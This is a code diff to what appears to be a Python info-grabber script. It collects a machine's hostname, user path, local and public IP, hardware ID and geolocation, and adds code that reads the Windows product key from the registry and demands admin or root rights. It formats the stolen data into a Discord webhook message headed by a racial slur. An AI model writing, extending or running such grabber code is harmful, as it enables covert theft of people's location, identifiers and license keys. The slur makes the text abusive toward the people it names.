@@ -1,3 +1,22 @@
+import ctypes, sys
+if platform.system() == "Windows":
+    import ctypes
+    def is_admin():
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    if is_admin():
+        pass
+    else:
+        sys.exit("Rerun with Administrator priv.")
+else:
+    def has_sudo():
+        return os.geteuid() == 0
+    if has_sudo():
+        pass
+    else:
+        sys.exit("Rerun with Sudo or Root")
 import os
 import discord_webhook
 import json
@@ -6,6 +25,7 @@ import socket
 import subprocess
 import requests
 from urllib.request import urlopen
+    
 # pre-run needed variables
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
 config_file = open("./CONFIG.json","r")
@@ -27,24 +47,71 @@ pcname = os.path.expanduser("~")
 data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
 respons = urlopen(data_link)
 data = json.load(respons)
+
+def get_windows_product_key():
+    import winreg
+    key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    value_name = "DigitalProductId"
+
+    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
+        product_key_bytes = winreg.QueryValueEx(key, value_name)[0]
+    
+    product_key = ""
+    for b in product_key_bytes[52:67]:
+        product_key += "%02x" % b
+    if platform.system() == "Windows":
+        return product_key
+    else:
+        return platform.system()
+def get_linux_distro():
+    try:
+        with open('/etc/os-release', 'r') as f:
+            lines = f.readlines()
+            distro_name = ""
+            distro_id = ""
+
+            for line in lines:
+                if line.startswith('PRETTY_NAME='):
+                    distro_name = line.split('=')[1].strip().strip('"')
+                elif line.startswith('ID='):
+                    distro_id = line.split('=')[1].strip().strip('"')
+                    break  # Stop reading after finding the ID field
+
+            if distro_id == "arch":
+                return f"{distro_name} (Based on Arch)"
+            elif distro_id == "debian":
+                return f"{distro_name} (Based on Debian)"
+            else:
+                return f"{distro_name} (Custom or Unknown)"
+    except FileNotFoundError:
+        pass
+    
+    return "Unknown"
 # webhook
 embedcont = f'''
 ---------------------
 get grabbed nigga
 ---------------------
 Operating system >> {platform.system()}
-OS.name          >> {os.name}
-HostName         >> {hostname}
-pc name          >> {pcname}
+OS.name -------- >> {os.name}
+HostName ------- >> {hostname}
+pc name -------- >> {pcname}
 local Ip Address >> {localIPAddr}
-Ip Address       >> {IPAddr.text}HWID             >> {hwid}
-ORG              >> {data["org"]}
-ORG hostname     >> {data["hostname"]}
-City             >> {data["city"]}
-Region           >> {data["region"]}
-Country          >> {data["country"]}
-Location         >> {data["loc"]}
-Postal           >> {data["postal"]}
+Ip Address ----- >> {IPAddr.text}HWID             >> {hwid}
+ORG ------------ >> {data["org"]}
+ORG hostname --- >> {data["hostname"]}
+City ----------- >> {data["city"]}
+Region --------- >> {data["region"]}
+Country -------- >> {data["country"]}
+Location ------- >> {data["loc"]}
+Postal --------- >> {data["postal"]}
+
+-----WINDOWS ONLY----
+Key ------------ >> {get_windows_product_key()}
+
+------LINUX ONLY-----
+Distribution: {get_linux_distro()}
+Based on ------- >> 
 '''
 
 def main():
